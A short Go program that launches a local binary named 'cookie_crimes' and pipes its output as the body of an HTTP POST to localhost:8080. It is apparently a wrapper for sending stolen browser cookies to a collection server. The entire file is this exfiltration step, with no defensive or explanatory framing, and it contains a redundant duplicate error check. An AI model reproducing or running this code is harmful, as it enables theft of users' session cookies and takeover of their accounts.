package main

import (
	"log"
	"net/http"
	"os/exec"
)

func main() {
	cmd := exec.Command("./cookie_crimes")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}

	if err := cmd.Start(); err != nil {
		log.Fatal(err)
	}

	if err != nil {
		log.Fatal(err)
	}

	resp, err := http.Post("http://localhost:8080", "application/json", stdout)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}
